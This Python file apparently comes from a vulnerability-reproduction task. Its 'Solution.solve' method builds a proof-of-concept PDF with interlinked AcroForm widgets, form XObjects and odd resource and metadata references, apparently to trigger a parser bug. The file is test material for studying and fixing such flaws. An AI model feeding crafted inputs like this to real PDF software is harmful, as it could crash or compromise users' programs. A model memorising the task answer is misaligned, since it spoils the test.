import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        return self._generate_pdf_poc()

    def _generate_pdf_poc(self) -> bytes:
        num_pages = 4
        widgets_per_page = 4
        num_forms = 3

        num_widgets = num_pages * widgets_per_page

        catalog_id = 1
        acroform_id = 2
        pages_id = 3
        font_id = 4

        first_page_id = 5
        last_page_id = first_page_id + num_pages - 1

        first_content_id = last_page_id + 1
        last_content_id = first_content_id + num_pages - 1

        parent_field_id = last_content_id + 1

        first_widget_id = parent_field_id + 1
        last_widget_id = first_widget_id + num_widgets - 1

        first_form_id = last_widget_id + 1
        last_form_id = first_form_id + num_forms - 1

        metadata_id = last_form_id + 1

        total_objects = metadata_id

        objects = [""] * (total_objects + 1)

        page_ids = list(range(first_page_id, first_page_id + num_pages))
        content_ids = list(range(first_content_id, first_content_id + num_pages))
        widget_ids = list(range(first_widget_id, first_widget_id + num_widgets))
        form_ids = list(range(first_form_id, first_form_id + num_forms))

        # Catalog (1)
        objects[catalog_id] = (
            f"<<\n"
            f"/Type /Catalog\n"
            f"/Pages {pages_id} 0 R\n"
            f"/AcroForm {acroform_id} 0 R\n"
            f">>\n"
        )

        # Pages root (3)
        kids_str = " ".join(f"{pid} 0 R" for pid in page_ids)
        objects[pages_id] = (
            f"<<\n"
            f"/Type /Pages\n"
            f"/Kids [ {kids_str} ]\n"
            f"/Count {num_pages}\n"
            f">>\n"
        )

        # Font (4)
        objects[font_id] = (
            "<<\n"
            "/Type /Font\n"
            "/Subtype /Type1\n"
            "/BaseFont /Helvetica\n"
            "/Name /Helv\n"
            ">>\n"
        )

        # Map pages to widgets
        page_widgets = {pid: [] for pid in page_ids}
        w_index = 0
        for pid in page_ids:
            for _ in range(widgets_per_page):
                if w_index >= len(widget_ids):
                    break
                wid = widget_ids[w_index]
                page_widgets[pid].append(wid)
                w_index += 1

        # Content streams and Page objects
        for idx, pid in enumerate(page_ids):
            content_id = content_ids[idx]
            text = f"BT /Helv 12 Tf 72 {720 - idx * 60} Td (Page {idx + 1} content) Tj ET\n"
            data = text.encode("ascii")
            length = len(data)
            content_obj = (
                f"<<\n"
                f"/Length {length}\n"
                f">>\n"
                f"stream\n"
                f"{text}"
                f"endstream\n"
            )
            objects[content_id] = content_obj

            annots_str = " ".join(f"{wid} 0 R" for wid in page_widgets[pid])
            page_obj = (
                f"<<\n"
                f"/Type /Page\n"
                f"/Parent {pages_id} 0 R\n"
                f"/MediaBox [0 0 612 792]\n"
                f"/Annots [ {annots_str} ]\n"
                f"/Resources {acroform_id} 0 R\n"
                f"/Contents {content_id} 0 R\n"
                f">>\n"
            )
            objects[pid] = page_obj

        # AcroForm (2)
        fields_entries = [f"{parent_field_id} 0 R"] + [f"{wid} 0 R" for wid in widget_ids]
        fields_str = " ".join(fields_entries)
        objects[acroform_id] = (
            f"<<\n"
            f"/Fields [ {fields_str} ]\n"
            f"/NeedAppearances true\n"
            f"/DA (/Helv 0 Tf 0 g)\n"
            f"/DR << /Font << /Helv {font_id} 0 R >> >>\n"
            f">>\n"
        )

        # Parent field
        kids_str2 = " ".join(f"{wid} 0 R" for wid in widget_ids)
        objects[parent_field_id] = (
            f"<<\n"
            f"/FT /Tx\n"
            f"/T (RootField)\n"
            f"/Kids [ {kids_str2} ]\n"
            f"/DA (/Helv 0 Tf 0 g)\n"
            f"/DR {acroform_id} 0 R\n"
            f">>\n"
        )

        # Widget annotations
        for idx, wid in enumerate(widget_ids):
            page_index = idx // widgets_per_page
            if page_index >= len(page_ids):
                page_index = len(page_ids) - 1
            pid = page_ids[page_index]
            row = idx % widgets_per_page
            y_top = 700 - row * 22 - page_index * 60
            y_bottom = y_top - 18
            form_id = form_ids[idx % len(form_ids)]
            widget_obj = (
                f"<<\n"
                f"/Type /Annot\n"
                f"/Subtype /Widget\n"
                f"/FT /Tx\n"
                f"/T (Field_{idx})\n"
                f"/F 4\n"
                f"/Parent {parent_field_id} 0 R\n"
                f"/Rect [50 {y_bottom} 300 {y_top}]\n"
                f"/P {pid} 0 R\n"
                f"/AP << /N {form_id} 0 R >>\n"
                f"/DR {acroform_id} 0 R\n"
                f">>\n"
            )
            objects[wid] = widget_obj

        # Metadata object
        metadata_stream = "<metadata><note>standalone form stress</note></metadata>\n"
        meta_bytes = metadata_stream.encode("ascii")
        meta_length = len(meta_bytes)
        objects[metadata_id] = (
            f"<<\n"
            f"/Type /Metadata\n"
            f"/Subtype /XML\n"
            f"/Length {meta_length}\n"
            f"/AcroForm {acroform_id} 0 R\n"
            f">>\n"
            f"stream\n"
            f"{metadata_stream}"
            f"endstream\n"
        )

        # Form XObjects
        for i, form_id in enumerate(form_ids):
            form_text = (
                f"q 1 0 0 1 0 0 cm "
                f"BT /Helv 10 Tf 0 0 Td (Reusable Form {i}) Tj ET "
                f"Q\n"
            )
            form_bytes = form_text.encode("ascii")
            form_length = len(form_bytes)
            form_obj = (
                f"<<\n"
                f"/Type /XObject\n"
                f"/Subtype /Form\n"
                f"/BBox [0 0 400 200]\n"
                f"/Resources {acroform_id} 0 R\n"
                f"/FormType 1\n"
                f"/Matrix [1 0 0 1 0 0]\n"
                f"/StructParent {i}\n"
                f"/Metadata {metadata_id} 0 R\n"
                f"/Length {form_length}\n"
                f">>\n"
                f"stream\n"
                f"{form_text}"
                f"endstream\n"
            )
            objects[form_id] = form_obj

        # Build final PDF
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        out = bytearray()
        out.extend(header)

        offsets = [0] * (total_objects + 1)

        for obj_id in range(1, total_objects + 1):
            offsets[obj_id] = len(out)
            out.extend(f"{obj_id} 0 obj\n".encode("ascii"))
            content = objects[obj_id]
            if not content.endswith("\n"):
                content += "\n"
            out.extend(content.encode("latin-1"))
            out.extend(b"endobj\n")

        xref_offset = len(out)

        out.extend(f"xref\n0 {total_objects + 1}\n".encode("ascii"))
        out.extend(b"0000000000 65535 f \n")
        for obj_id in range(1, total_objects + 1):
            off = offsets[obj_id]
            out.extend(f"{off:010d} 00000 n \n".encode("ascii"))

        trailer = (
            f"trailer\n"
            f"<< /Size {total_objects + 1} /Root {catalog_id} 0 R >>\n"
            f"startxref\n"
            f"{xref_offset}\n"
            f"%%EOF\n"
        )
        out.extend(trailer.encode("ascii"))

        return bytes(out)